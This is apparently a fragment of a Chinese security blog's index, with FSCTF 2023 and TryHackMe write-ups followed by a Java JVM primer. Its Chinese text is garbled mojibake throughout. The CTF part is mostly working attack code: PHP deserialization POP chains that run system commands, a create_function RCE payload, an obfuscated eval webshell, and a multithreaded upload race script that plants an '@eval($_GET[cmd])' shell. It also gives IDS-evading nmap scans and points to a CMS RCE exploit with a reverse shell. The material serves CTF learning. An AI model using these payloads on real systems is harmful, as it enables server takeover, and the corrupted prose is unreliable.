$_POST['FL_AG']; if(isset($c)) { if (preg_match('/^.*(flag).*$/', $ja)) { echo 'You are bad guy!!!'; } else { echo \"Congratulation!!\"; echo $hint1; } } else { echo \"Please input my love FL_AG\"; } } else{ die(\"game over!\"); } ?&gt; game over! &lt;?php highlight_file(__FILE__); error_reporting(0); include \"globals.php\"; $FAKE_KEY = \"Do you love CTF?\"; $KEY = \"YES I love\"; $str = $_GET['str']; echo $flag; if (unserialize($str) === \"$KEY\") { echo \"$hint2\"; } ?&gt; &lt;?php $str = \"YES I love\"; echo serialize($str); ?&gt; &lt;?php highlight_file(__FILE__); error_reporting(0); class Clazz { public $a; public $b; public function __wakeup() { $this-&gt;a = file_get_contents(\"php://filter/read=convert.base64-encode/resource=g0t_f1ag.php\"); } public function __destruct() { echo $this-&gt;b; } } @unserialize($_POST['data']); ?&gt; å¼•ç”¨ç»•è¿‡å³å¯ [FSCTF 2023]å·´å·´æ‰˜æ–¯ï¼ uaå¤´ä¼ªé€ ï¼Œæœ¬åœ°IPåœ°å€ä¼ªé€ ï¼ˆè¿™é‡Œæ˜¯refererå¤´ï¼‰ï¼Œæœ€åç®€å•ä¼ªåè®® [FSCTF 2023]å¯»æ‰¾è››ä¸é©¬è¿¹ ç¬¬ä¸€æ®µï¼šFSCTF{Tell_y0U_n ç¬¬äºŒæ®µï¼šoT_To_p ç¬¬ä¸‰æ®µï¼šoInT_oUt_ ç¬¬å››æ®µï¼štH@t_y000//è¿™é‡Œçš„æ–‡å­—ä¿®å¤ï¼Œå¯ä»¥ç™¾åº¦æœç´¢ç«ç‹æ¢å¤æ–‡å­—ç¼–ç  ä¸è‹¹æœæœ‰å…³æƒ³åˆ°.DS_store ç¬¬äº”æ®µï¼šu_Don't_ ç¬¬å…­æ®µï¼šbelieve_it!} æœ€ç»ˆï¼šFSCTF{Tell_y0U_noT_To_poInT_oUt_tH@t_y000u_Don't_believe_it!} [FSCTF 2023]æ˜¯å…„å¼Ÿï¼Œå°±æ¥ä¼ ä½ ã®ğŸï¼ æµ…æµ…æ€»ç»“ä¸€ä¸ªPHPä¸Šä¼ é»‘åå•ï¼š pht, phpt, phtml, php3,php4,php5,php6ï¼Œpwmlï¼Œphpï¼Œhtaccessï¼Œusr.iniï¼Œphtm è¿™é‡Œä¸»è¦æ˜¯ç»•è¿‡é»‘åå•æ£€æµ‹ï¼Œphtç»æµ‹è¯•å¯ä»¥ç»•è¿‡ å¦å¤–éœ€è¦ç»•è¿‡æ–‡ä»¶å¤´æ£€æµ‹ï¼Œæ–‡ä»¶å†…å®¹é•¿åº¦é™åˆ¶ å‚è€ƒæ–‡ç«  æ— å­—æ¯æ•°å­—webshellæ€»ç»“ [FSCTF 2023]ez_php2 &lt;?php highlight_file(__file__); Class Rd{ public $ending; public $cl; public $poc; public function __destruct() { echo \"All matters have concluded\"; die($this-&gt;ending); } public function __call($name, $arg) { foreach ($arg as $key =&gt;$value) { if($arg[0]['POC']==\"1111\") { echo \"1\"; $this-&gt;cl-&gt;var1 = \"system\"; } } } } class Poc{ public $payload; public $fun; public function __set($name, $value) { $this-&gt;payload = $name; $this-&gt;fun = $value; } function getflag($paylaod) { echo \"Have you genuinely accomplished what you set out to do?\"; file_get_contents($paylaod); } } class Er{ public $symbol; public $Flag; public function __construct() { $this-&gt;symbol = True; } public function __set($name, $value)//system { $value($this-&gt;Flag); } } class Ha{ public $start; public $start1; public $start2; public function __construct() { echo $this-&gt;start1.\"__construct\".\"&lt;/br&gt;\"; } public function __destruct() { if($this-&gt;start2===\"11111\") { $this-&gt;start1-&gt;Love($this-&gt;start); echo \"You are Good!\"; } } } if(isset($_GET['Ha_rde_r'])) { unserialize($_GET['Ha_rde_r']); } else{ die(\"You are Silly goose!\"); } ?&gt; You are Silly goose! &lt;?php Class Rd{ public $ending; public $cl; public $poc; } class Poc{ public $payload; public $fun; } class Er{ public $symbol; public $Flag; } class Ha{ public $start; public $start1; public $start2; } $pop = new Ha(); $pop-&gt;start2 = \"11111\"; $pop-&gt;start = array(\"POC\"=&gt;\"1111\"); $pop-&gt;start1 = new Rd(); $pop-&gt;start1-&gt;cl = new Er(); $pop-&gt;start1-&gt;cl-&gt;Flag = \"cat /flag\"; echo serialize($pop); ?&gt; [FSCTF 2023]ç­¾åˆ°plus æ‰«ç›®å½•å‘ç°äº†ä¸€ä¸ªshell.phpï¼Œå…¶ä¸­æ˜¯phpinfoé¡µé¢ï¼Œä¸”flagä¸ºfake flag PHP&lt;=7.4.21 Development Serveræºç æ³„éœ²æ¼æ´ ä¹‹åæ²¡æ€è·¯ï¼Œçœ‹äº†wpå‘ç°æ˜¯ä¸ªæ¼æ´ PHP&lt;=7.4.21æ—¶é€šè¿‡php -Så¼€èµ·çš„WEBæœåŠ¡å™¨å­˜åœ¨æºç æ³„éœ²æ¼æ´ï¼Œå¯ä»¥å°†PHPæ–‡ä»¶ä½œä¸ºé™æ€æ–‡ä»¶ç›´æ¥è¾“å‡ºæºç ã€‚ phpå¯åŠ¨å†…ç½®webæœåŠ¡å™¨ PHPä»5.4å¼€å§‹ï¼Œå°±æä¾›äº†ä¸€ä¸ªå†…ç½®çš„webæœåŠ¡å™¨ï¼Œä¸»è¦æ˜¯ç”¨æ¥åšæœ¬åœ°çš„å¼€å‘ç”¨çš„ã€‚ å‰æï¼šphpå·²ç»åŠ å…¥åˆ°æœ¬åœ°ç”µè„‘çš„ç¯å¢ƒå˜é‡ä¸­ cd é¡¹ç›®ç›®å½• php -S localhost:8080 å‚è€ƒé“¾æ¥: phpå¦‚ä½•å¯åŠ¨å†…ç½®webæœåŠ¡å™¨ï¼ŒPHP&lt;=7.4.21 Development Serveræºç æ³„éœ²æ¼æ´ å…³é—­è‡ªåŠ¨æ›´æ–° HTTP/1.1 200 OK Host: node4.anna.nssctf.cn:28122 Date: Sun, 17 Mar 2024 08:28:42 GMT Connection: close Content-Length: 443 &lt;?php phpinfo(); $ğŸ˜€=\"a\"; $ğŸ˜=\"b\"; $ğŸ˜‚=\"c\"; $ğŸ¤£=\"d\"; $ğŸ˜ƒ=\"e\"; $ğŸ˜„=\"f\"; $ğŸ˜…=\"g\"; $ğŸ˜†=\"h\"; $ğŸ˜‰=\"i\"; $ğŸ˜Š=\"j\"; $ğŸ˜‹=\"k\"; $ğŸ˜=\"l\"; $ğŸ˜=\"m\"; $ğŸ˜˜=\"n\"; $ğŸ˜—=\"o\"; $ğŸ˜™=\"p\"; $ğŸ˜š=\"q\"; $ğŸ™‚=\"r\"; $ğŸ¤—=\"s\"; $ğŸ¤©=\"t\"; $ğŸ¤”=\"u\"; $ğŸ¤¨=\"v\"; $ğŸ˜=\"w\"; $ğŸ˜‘=\"x\"; $ğŸ˜¶=\"y\"; $ğŸ™„=\"z\"; $ğŸ˜­ = $ğŸ˜™. $ğŸ˜€. $ğŸ¤—. $ğŸ¤—. $ğŸ¤©. $ğŸ˜†. $ğŸ™‚. $ğŸ¤”; if (isset($_GET['ğŸ‘½ğŸ¦'])) { eval($ğŸ˜­($_GET['ğŸ‘½ğŸ¦'])); }; ?&gt; å¤åˆ¶å³ä¾§å†…å®¹å³å¯ [FSCTF 2023]CanCanNeed Create_Function Rce æ–°çŸ¥è¯†ï¼šcreate_function rceç»•è¿‡ï¼Œå‚è€ƒæ–‡ç« ï¼šcreate_functionå‡½æ•°å¦‚ä½•å®ç°RCE &lt;?php class Noteasy{ protected $param1 = \"create_function\"; protected $param2 = \";}system(\\$_POST[1]);//\"; } $pop = new Noteasy(); echo base64_encode(serialize($pop)); ?&gt; [FSCTF 2023]åŠ é€ŸåŠ é€Ÿ è¿™é“é¢˜è¯´æ˜¯æ¡ä»¶ç«äº‰ï¼Œä½†æˆ‘ä¸ç†è§£ä»–ä»¬å¦‚ä½•çœ‹å‡ºæ¥çš„ã€‚ã€‚ã€‚ä¸‹é¢æ˜¯ç½‘æ‰’çš„exp éšä¾¿ä¸Šä¼ jpgæ–‡ä»¶å¾—åˆ°æ–‡ä»¶ä¿å­˜è·¯å¾„ï¼Œè¿™é‡Œç”¨bpå’Œè„šæœ¬éƒ½è¯•è¯• import requests from concurrent.futures import ThreadPoolExecutor def td(list): url = 'http://node4.anna.nssctf.cn:28472/index.php' files = { 'upload_file': ('hybcx.php',\"&lt;?php fputs(fopen('shell.php','w'),'&lt;?php @eval($_GET[cmd]);?&gt;' ); ?&gt;\") } data = {'submit': 'ä¸Šä¼ '} r = requests.post(url=url, data=data, files=files) re = requests.get('http://node4.anna.nssctf.cn:28472/upload/hybcx.php') if re.status_code == 200: print('ä¸Šä¼ æˆåŠŸ') if __name__ == '__main__': with ThreadPoolExecutor(50) as p: p.map(td, range(2000)) bpå…ˆæŠ“ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ åŒ…ï¼Œpayloadå¦‚ä¸‹ï¼š &lt;?php fputs(fopen('hybcx.php','w'),'&lt;?php @eval($_GET[cmd]);?&gt;' ); ?&gt; ä¹‹åæŠ“ä¸€ä¸ªè®¿é—®ç›¸åº”çš„phpæ–‡ä»¶çš„åŒ…ï¼Œæ¥ç€payloadéƒ½è®¾ç½®ä¸ºNULL payloadsï¼Œæ— é™é‡å¤ï¼Œå¼€å§‹æ”»å‡»å³å¯ï¼Œå¦‚ä¸‹å›¾ï¼Œä¸Šä¼ æˆåŠŸ","tags":["CTFèµ›äº‹"],"categories":["CTFèµ›äº‹"]},{"title":"THM-Vulnerability Capstone","path":"/2024/03/17/thm-vulnerability-capstone-lian-xi/","content":"0x01 ç®€ä»‹ é€šè¿‡å®Œæˆâ€œæ¼æ´ç ”ç©¶â€æ¨¡å—çš„é¡¶å³°å®¤ï¼Œæ€»ç»“åœ¨æœ¬æ¨¡å—ä¸­å­¦åˆ°çš„æŠ€èƒ½ã€‚ Ackme Support Incorporated æœ€è¿‘å»ºç«‹äº†ä¸€ä¸ªæ–°åšå®¢ã€‚ä»–ä»¬çš„å¼€å‘å›¢é˜Ÿè¦æ±‚åœ¨åˆ›å»ºå¹¶å‘å…¬ä¼—å‘å¸ƒæ–‡ç« ä¹‹å‰è¿›è¡Œå®‰å…¨å®¡æ ¸ã€‚ æ‚¨çš„ä»»åŠ¡æ˜¯å¯¹åšå®¢è¿›è¡Œå®‰å…¨å®¡æ ¸ï¼›å¯»æ‰¾å¹¶æ»¥ç”¨æ‚¨å‘ç°çš„ä»»ä½•æ¼æ´ã€‚ 0x02 æŒ‘æˆ˜ å¾ˆæ˜æ˜¾ï¼ŒFUEL CMSæ¡†æ¶ï¼Œç‰ˆæœ¬1.4 æ¼æ´åº“æŸ¥çœ‹CMSå†å²æ¼æ´ï¼Œå¾—çŸ¥CVEç¼–å· å¦‚ä¸‹å›¾æˆ‘ç›´æ¥å°±å¼€å§‹searchsploitæœå¯»ç›¸å…³pocåˆ©ç”¨ï¼Œç»“æœç›¸å…³çš„æ–‡ä»¶éƒ½æ²¡æ³•æ‰§è¡Œï¼ˆå­˜åœ¨ä¸åŒçš„é”™è¯¯ï¼‰ å› æ­¤æˆ‘ä»¬å¯ä»¥Googleæœç´¢ä¸€ä¸‹ï¼šhttps://github.com/ice-wzl/Fuel-1.4.1-RCE-Updated è¾“å…¥ç›®æ ‡åœ°å€ï¼Œä»¥åŠåå¼¹shellçš„æœ¬åœ°åœ°å€","tags":["TryHackMe"],"categories":["TryHackMe"]},{"title":"THM-Net Sec Challenge","path":"/2024/03/17/thm-net-sec-challenge/","content":"0x01 ç®€ä»‹ ä½¿ç”¨æ­¤æŒ‘æˆ˜æ¥æµ‹è¯•æ‚¨å¯¹ç½‘ç»œå®‰å…¨æ¨¡å—ä¸­è·å¾—çš„æŠ€èƒ½çš„æŒæ¡ç¨‹åº¦ã€‚æ­¤æŒ‘æˆ˜ä¸­çš„æ‰€æœ‰é—®é¢˜éƒ½å¯ä»¥ä»…ä½¿ç”¨ nmap ã€ telnet å’Œ hydra æ¥è§£å†³ã€‚ 0x02 å¼€å§‹æŒ‘æˆ˜ nmap -T4 -sS -p- 10.10.6.243 æ‰“å¼€äº†6ä¸ªtcpç«¯å£ é‡‡ç”¨telnetè¿œç¨‹ç«¯å£è®¿é—®å¯¹æ–¹æœåŠ¡å™¨å³å¯ telnet ip 80 sshæœåŠ¡å™¨éšè—çš„æ ‡å¤´æ˜¯ä»€ä¹ˆ ftpç›‘å¬çš„æ˜¯éæ ‡å‡†ç«¯å£ï¼Œè¯·é—®ftpæœåŠ¡å™¨ç‰ˆæœ¬ä¿¡æ¯ æˆ‘ä»¬ä½¿ç”¨ç¤¾äº¤å·¥ç¨‹äº†è§£äº†ä¸¤ä¸ªç”¨æˆ·åï¼š eddie å’Œ quinn ã€‚éšè—åœ¨è¿™ä¸¤ä¸ªå¸æˆ·æ–‡ä»¶ä¹‹ä¸€ä¸­å¹¶å¯é€šè¿‡ FTP è®¿é—®çš„æ ‡å¿—æ˜¯ä»€ä¹ˆï¼Ÿ ç»éªŒè¯ï¼Œflagåœ¨ç¬¬äºŒä¸ªç”¨æˆ·ä¸Š ä»»åŠ¡æ˜¯è®©æˆ‘ä»¬nmapæ‰«æä¸»æœºï¼Œä½†ä¸èƒ½è¢«IDSæ£€æµ‹åˆ°ï¼Œè¿™é‡Œå°±åªèƒ½ç”¨nmapçš„NULLæ‰«ææ¨¡å¼ nmap -sN -v ip","tags":["TryHackMe"],"categories":["TryHackMe"]},{"title":"JavaåŸºç¡€çŸ¥è¯†æ€»ç»“","path":"/2024/03/15/java-ji-chu-zhi-shi/","content":"0x01 å‰è¨€ æœ¬æ–‡æ—¥åå°±å½“åšJavaçŸ¥è¯†æ€»ç»“çš„åœ°æ–¹äº†ï¼ŒJavaçŸ¥è¯†çš„åºå¤§ä»¤æˆ‘æœ›è€Œç”Ÿç•ï¼Œä½†ç›®å‰è¿˜ä¸è‡³äºå¾ˆæ·±å…¥çš„å­¦ä¹ ï¼Œå› è€Œå°±æ ¹æ®æˆ‘å­¦ä¹ è·¯çº¿ä¸Šé‡åˆ°çš„JavaåŸºç¡€é—®é¢˜æ¥åšå‡ºç›¸å¯¹åº”çš„å­¦ä¹ ã€‚ 0x02 ä½•ä¸ºJVM Javaç¨‹åºå¿…é¡»è¦è¿è¡Œåœ¨JVMï¼ˆJavaè™šæ‹Ÿæœºï¼‰ä¸Šï¼Œä½†åœ¨æJavaä¹‹å‰ï¼Œå…ˆè¦å®‰è£…jdkï¼Œé‚£è¦æ‰¯åˆ°è¿™ä¸¤ä¸ªåè¯ï¼Œè¿˜éœ€è¦ç†è§£JREã€‚ä»¥ä¸‹æ¥å¹…å›¾ï¼š JVMã€JREã€JDK æœ‰ä»€ä¹ˆå…³ç³» JDKï¼ˆJava Development Kitï¼‰æ˜¯ç”¨äºå¼€å‘ Java åº”ç”¨ç¨‹åºçš„è½¯ä»¶ç¯å¢ƒã€‚é‡Œé¢åŒ…å«è¿è¡Œæ—¶ç¯å¢ƒï¼ˆJREï¼‰å’Œå…¶ä»– Java å¼€å‘æ‰€éœ€çš„å·¥å…·ï¼Œæ¯”å¦‚è¯´è§£é‡Šå™¨ï¼ˆjavaï¼‰ã€ç¼–è¯‘å™¨ï¼ˆjavacï¼‰ã€æ–‡æ¡£ç”Ÿæˆå™¨ï¼ˆjavadocï¼‰ç­‰ç­‰ã€‚ JREï¼ˆJava Runtime Environmentï¼‰æ˜¯ç”¨äºè¿è¡Œ Java åº”ç”¨ç¨‹åºçš„è½¯ä»¶ç¯å¢ƒã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœåªæƒ³è¿è¡Œ Java ç¨‹åºè€Œä¸éœ€è¦å¼€å‘ Java ç¨‹åºçš„è¯ï¼Œåªéœ€è¦å®‰è£… JRE å°±å¯ä»¥äº†ã€‚ JVM (Java Virtual Machine) ï¼Œä¹Ÿå°±æ˜¯ Java è™šæ‹Ÿæœºï¼Œç”±ä¸€å¥—å­—èŠ‚ç æŒ‡ä»¤é›†ã€ä¸€ç»„å¯„å­˜å™¨ã€ä¸€ä¸ªæ ˆã€ä¸€ä¸ªåƒåœ¾å›æ”¶å †å’Œä¸€ä¸ªå­˜å‚¨æ–¹æ³•åŸŸç­‰ç»„æˆï¼Œå±è”½äº†ä¸åŒæ“ä½œç³»ç»Ÿï¼ˆmacOSã€Windowsã€Linuxï¼‰çš„å·®å¼‚æ€§ï¼Œä½¿å¾— Java èƒ½å¤Ÿâ€œä¸€æ¬¡ç¼–è¯‘ï¼Œåˆ°å¤„è¿è¡Œâ€ã€‚ æ¯”å¦‚è¯´æˆ‘ç”¨ macOS ç”Ÿæˆäº†ä¸€ä¸ª jar åŒ…ï¼ˆé‡Œé¢æ˜¯æ‰“åŒ…å¥½çš„å­—èŠ‚ç â€”â€”å¯ä»¥åœ¨ Java è™šæ‹Ÿæœºä¸Šè¿è¡Œçš„ç›®æ ‡ä»£ç ï¼‰ï¼Œå¯ä»¥ä¸¢ç»™ Windows ç”¨æˆ·ç›´æ¥è¿è¡Œï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä¸Šä¼ åˆ° Linux æœåŠ¡å™¨è¿è¡Œã€‚ è¿™æ˜¯ Oracle å®˜æ–¹ç»™å‡ºçš„ JDKã€JREã€JVM å…³ç³»å›¾ã€‚ é‚£é’ˆå¯¹ä¸åŒçš„æ“ä½œç³»ç»Ÿï¼Œå®˜æ–¹ä¹Ÿæä¾›äº†ä¸åŒçš„ JDK å®‰è£…åŒ…ï¼šJDKä¸‹è½½å®˜æ–¹é“¾æ¥ JVMçš„ä½œç”¨ æˆ‘ä»¬çŸ¥é“åœ¨Javaç¨‹åºè¿è¡Œä¹‹åä¼šçœ‹åˆ°.javaã€.classç­‰æ–‡ä»¶ï¼Œæ¥ä¸‹æ¥è§£é‡Šä¸€ä¸‹å„è‡ªçš„å«ä¹‰ .java æ˜¯æºä»£ç ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¼€å‘äººå‘˜å¯ä»¥çœ‹æ‡‚çš„ï¼Œå¯ä»¥ç¼–å†™çš„ï¼› .class æ˜¯å­—èŠ‚ç æ–‡ä»¶ï¼Œæ˜¯ç»è¿‡ javac ç¼–è¯‘åçš„æ–‡ä»¶ï¼Œæ˜¯äº¤ç»™ JVMopen in new window æ‰§è¡Œçš„æ–‡ä»¶ã€‚ Javaç¨‹åºåœ¨æ‰§è¡Œçš„æ—¶å€™ï¼Œç¬¬ä¸€é“å·¥åºå°±æ˜¯é€šè¿‡javacå‘½ä»¤å°†Javaæºç ç¼–è¯‘ä¸ºå­—èŠ‚ç ã€‚ æ¯”å¦‚è¯´æˆ‘ä»¬å¯ä»¥ä¸»åŠ¨æ‰§è¡Œ javac Hello.java å‘½ä»¤å°†æºä»£ç æ–‡ä»¶ç¼–è¯‘ä¸º Hello.class æ–‡ä»¶ï¼ˆç”¨ Intellij IDEA çš„è¯ï¼Œå¹¶ä¸éœ€è¦æˆ‘ä»¬ä¸»åŠ¨å»ç¼–è¯‘ã€Œjavacã€ï¼Œç›´æ¥è¿è¡Œå°±å¯ä»¥è‡ªåŠ¨ç”Ÿæˆ .class æ–‡ä»¶ï¼‰ã€‚ ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ java å‘½ä»¤è¿è¡Œå­—èŠ‚ç ï¼ˆæ¯”å¦‚è¯´ java Helloï¼‰ï¼Œæ­¤æ—¶å°±æœ‰ 2 ç§å¤„ç†æ–¹å¼äº†ã€‚ 1ã€å­—èŠ‚ç ç”± JVM é€æ¡è§£é‡Šæ‰§è¡Œã€‚ 2ã€éƒ¨åˆ†å­—èŠ‚ç å¯èƒ½ç”± JITï¼ˆå³æ—¶ç¼–è¯‘ï¼Œæˆ³é“¾æ¥äº†è§£open in new windowï¼‰ç¼–è¯‘ä¸ºæœºå™¨æŒ‡ä»¤ç›´æ¥æ‰§è¡Œã€‚ â‘ ã€é€æ¡è§£é‡Šæ‰§è¡Œï¼š é€æ¡è§£é‡Šæ‰§è¡Œæ˜¯ Java è™šæ‹Ÿæœºçš„åŸºæœ¬æ‰§è¡Œæ¨¡å¼ã€‚åœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼ŒJava è™šæ‹Ÿæœºä¼šé€æ¡è¯»å–å­—èŠ‚ç æ–‡ä»¶ä¸­çš„æŒ‡ä»¤ï¼Œå¹¶å°†å…¶è§£é‡Šä¸ºå¯¹åº”çš„åº•å±‚æ“ä½œã€‚è§£é‡Šæ‰§è¡Œçš„ä¼˜ç‚¹æ˜¯å®ç°ç®€å•ï¼Œå¯åŠ¨é€Ÿåº¦è¾ƒå¿«ï¼Œä½†ç”±äºæ¯æ¬¡æ‰§è¡Œéƒ½éœ€è¦å¯¹å­—èŠ‚ç è¿›è¡Œè§£é‡Šï¼Œå› æ­¤æ‰§è¡Œæ•ˆç‡ç›¸å¯¹è¾ƒä½ã€‚ æ€»ç»“ä¸€ä¸‹é€æ¡è§£é‡Šæ‰§è¡Œçš„ç‰¹ç‚¹ï¼š å®ç°ç®€å• å¯åŠ¨é€Ÿåº¦è¾ƒå¿« æ‰§è¡Œæ•ˆç‡è¾ƒä½ â‘¡ã€JIT å³æ—¶ç¼–è¯‘ï¼š ä¸ºäº†æé«˜ Java ç¨‹åºçš„æ‰§è¡Œæ•ˆç‡ï¼ŒJava è™šæ‹Ÿæœºå¼•å…¥äº†å³æ—¶ç¼–è¯‘ï¼ˆJITï¼ŒJust-In-Time Compilationopen in new windowï¼‰æŠ€æœ¯ã€‚åœ¨ JIT æ¨¡å¼ä¸‹ï¼ŒJava è™šæ‹Ÿæœºä¼šåœ¨è¿è¡Œæ—¶å°†é¢‘ç¹æ‰§è¡Œçš„å­—èŠ‚ç ç¼–è¯‘ä¸ºæœ¬åœ°æœºå™¨ç ï¼Œè¿™æ ·å°±å¯ä»¥ç›´æ¥åœ¨ç¡¬ä»¶ä¸Šè¿è¡Œï¼Œè€Œä¸éœ€è¦å†æ¬¡è§£é‡Šã€‚è¿™æ ·åšçš„ç»“æœæ˜¯æ˜¾è‘—æé«˜äº†ç¨‹åºçš„æ‰§è¡Œé€Ÿåº¦ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒJIT ç¼–è¯‘å™¨å¹¶ä¸ä¼šç¼–è¯‘æ‰€æœ‰çš„å­—èŠ‚ç ï¼Œè€Œæ˜¯æ ¹æ®ä¸€å®šçš„ç­–ç•¥ï¼Œä»…ç¼–è¯‘è¢«é¢‘ç¹è°ƒç”¨çš„ä»£ç æ®µï¼ˆçƒ­ç‚¹ä»£ç ï¼‰ã€‚ æ€»ç»“ä¸€ä¸‹ JIT å³æ—¶ç¼–è¯‘çš„ç‰¹ç‚¹ï¼š æé«˜æ‰§è¡Œæ•ˆç‡ ç¼–è¯‘çƒ­ç‚¹ä»£ç  åŠ¨æ€ä¼˜åŒ– å®é™…ä¸Šï¼Œç°ä»£ Java è™šæ‹Ÿæœºï¼ˆå¦‚ HotSpotï¼‰é€šå¸¸ä¼šç»“åˆè¿™ä¸¤ç§æ‰§è¡Œæ–¹å¼ï¼Œå³è§£é‡Šæ‰§è¡Œå’Œ JIT å³æ—¶ç¼–è¯‘ã€‚åœ¨ç¨‹åºè¿è¡ŒåˆæœŸï¼ŒJava è™šæ‹Ÿæœºä¼šé‡‡ç”¨è§£é‡Šæ‰§è¡Œï¼Œä»¥å‡å°‘å¯åŠ¨æ—¶é—´ã€‚éšç€ç¨‹åºçš„è¿è¡Œï¼ŒJava è™šæ‹Ÿæœºä¼šè¯†åˆ«å‡ºçƒ­ç‚¹ä»£ç å¹¶ä½¿ç”¨ JIT ç¼–è¯‘å™¨å°†å…¶ç¼–è¯‘ä¸ºæœ¬åœ°æœºå™¨ç ï¼Œä»è€Œæé«˜ç¨‹åºçš„æ‰§è¡Œæ•ˆç‡ã€‚è¿™ç§ç»“åˆç­–ç•¥ç§°ä¸ºæ··åˆæ¨¡å¼ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸ºäº†è·¨å¹³å°ï¼ŒJava æºä»£ç é¦–å…ˆä¼šç¼–è¯‘æˆå­—èŠ‚ç ï¼Œå­—èŠ‚ç ä¸æ˜¯æœºå™¨è¯­è¨€ï¼Œéœ€è¦ JVM æ¥è§£é‡Šã€‚ æœ‰äº† JVM è¿™ä¸ªä¸­é—´å±‚ï¼ŒJava çš„è¿è¡Œæ•ˆç‡å°±æ²¡æœ‰ç›´æ¥æŠŠæºä»£ç ç¼–è¯‘ä¸ºæœºå™¨ç æ¥å¾—æ•ˆç‡æ›´é«˜ï¼Œè¿™ä¸ªåº”è¯¥èƒ½ç†è§£ï¼Œå¤šäº†ä¸­é—´å•†å˜›ã€‚æ‰€ä»¥ä¸ºäº†æé«˜æ•ˆç‡ï¼ŒJVM å¼•å…¥äº† JIT ç¼–è¯‘å™¨ï¼ŒæŠŠä¸€äº›ç»å¸¸æ‰§è¡Œçš„å­—èŠ‚ç ç›´æ¥ææˆæœºå™¨ç ã€‚ æ‰€ä»¥ï¼ŒJava æ˜¯è§£é‡Šå’Œç¼–è¯‘å¹¶å­˜ã€‚ä½†é€šå¸¸æ¥è¯´ï¼Œæˆ‘ä»¬ä¼šè¯´â€œJava æ˜¯ç¼–è¯‘å‹è¯­è¨€â€ï¼Œå°½ç®¡è¿™æ ·å¹¶ä¸å‡†ç¡®ï¼Œä¸»è¦æ˜¯ JIT æ˜¯åé¢æ‰å‡ºç°çš„ï¼Œâ€œå…ˆå…¥ä¸ºä¸»å˜›â€ã€‚ ä»€ä¹ˆæ˜¯JVM æˆ‘ä»¬å¯ä»¥è”æƒ³ä¸€ä¸‹ç›´è¯‘å™¨ï¼ˆè§£é‡Šå™¨ï¼‰ï¼Œå°±æ˜¯æ¯è·‘ä¸€è¡Œä»£ç å°±ç”Ÿæˆæœºå™¨ç ï¼Œç„¶åæ‰§è¡Œï¼Œæ¯”å¦‚è¯´Pythonå’ŒRubyã€‚ å¦‚æœæ¯ä¸ªæ“ä½œç³»ç»Ÿéƒ½å®‰è£…ä¸€ä¸ªè§£é‡Šå™¨ï¼Œé‚£å°±å¯ä»¥è§£å†³è·¨å¹³å°è¿è¡Œçš„é—®é¢˜äº†ã€‚ä½†æ˜¯ç›´è¯‘å™¨å´æœ‰ä¸ªç¼ºç‚¹ï¼Œå°±æ˜¯æ²¡åŠæ³•å‘ç¼–è¯‘å™¨é‚£æ ·å¯¹ä¸€äº›çƒ­ç‚¹ä»£ç è¿›è¡Œä¼˜åŒ–ï¼Œä»è€Œè®©ç¨‹åºåœ¨æœºå™¨ä¸Šè·‘çš„æ›´å¿«ã€‚ é‚£Javaå°±æ¥äº†ä¸ªç»“åˆä½“ï¼Œç¼–è¯‘å™¨+ç›´è¯‘å™¨=JVMã€‚ç¼–è¯‘å™¨è´Ÿè´£Javaæºä»£ç ç¼–è¯‘ä¸ºå­—èŠ‚ç ï¼ŒJavaè™šæ‹ŸæœºæŠŠå­—èŠ‚ç è½¬æ¢ä¸ºæœºå™¨ç ï¼Œè½¬æ¢çš„æ—¶å€™å¯ä»¥åšä¸€äº›ä¼˜åŒ–å’Œå‹ç¼©ï¼Œé€šè¿‡JITæ¥å®Œæˆï¼Œè¿™æ ·ç¨‹åºå°±è·‘å¾—å¿«äº† Java è™šæ‹Ÿæœºï¼šJava Virtual Machineï¼Œç®€ç§° JVMï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬æ¥ä¸‹æ¥è¦å­¦ä¹ çš„é‡ç‚¹ã€‚ å­—èŠ‚ç ï¼šBytecodeopen in new windowï¼Œæ¥ä¸‹æ¥ä¼šç»†è®²ã€‚ JITï¼šJust-In-Timeï¼Œå³æ—¶ç¼–è¯‘å™¨open in new windowï¼Œåé¢ä¼šç»†è®²ã€‚ è¿™æ ·çš„è¯ï¼Œä¸ä»…è·¨å¹³å°çš„ç›®çš„è¾¾åˆ°äº†ï¼Œè€Œä¸”æ€§èƒ½å¾—åˆ°äº†ä¼˜åŒ–ï¼Œä¸¤å…¨å…¶ç¾ï¼ â€œä¸ºä»€ä¹ˆ Java è™šæ‹Ÿæœºä¼šå« Java è™šæ‹Ÿæœºå‘¢ï¼Ÿâ€ è™šæ‹Ÿæœºï¼Œé¡¾åæ€ä¹‰ï¼Œå°±æ˜¯è™šæ‹Ÿçš„æœºå™¨ï¼ˆå¤šè‹ç™½çš„è§£é‡Šï¼‰ï¼Œåæ­£å°±æ˜¯çœ‹ä¸è§æ‘¸ä¸ç€çš„æœºå™¨ï¼Œä¸€ä¸ªç›¸å¯¹ç‰©ç†æœºçš„å«æ³•ï¼Œä½ æŠŠå®ƒæƒ³è±¡æˆä¸€ä¸ªä¼šæ‰§è¡Œå­—èŠ‚ç çš„æ€ªå…½å§ã€‚ è¯´ç™½äº†ï¼Œå°±æ˜¯æˆ‘ä»¬ç¼–å†™ Java ä»£ç ï¼Œç¼–è¯‘ Java ä»£ç ï¼Œç›®çš„ä¸æ˜¯è®©å®ƒåœ¨ Linuxã€Windows æˆ–è€… MacOS ä¸Šè·‘ï¼Œè€Œæ˜¯åœ¨ JVM ä¸Šè·‘ã€‚ JVMç»„ç»‡æ¶æ„ JVM å¤§è‡´å¯ä»¥åˆ’åˆ†ä¸ºä¸‰ä¸ªéƒ¨é—¨ï¼Œåˆ†åˆ«æ˜¯ç±»åŠ è½½å™¨ï¼ˆClass Loaderï¼‰ã€è¿è¡Œæ—¶æ•°æ®åŒºï¼ˆRuntime Data Areasï¼‰å’Œæ‰§è¡Œå¼•æ“ï¼ˆExcution Engineï¼‰ï¼Œè§ä¸‹å›¾ã€‚ 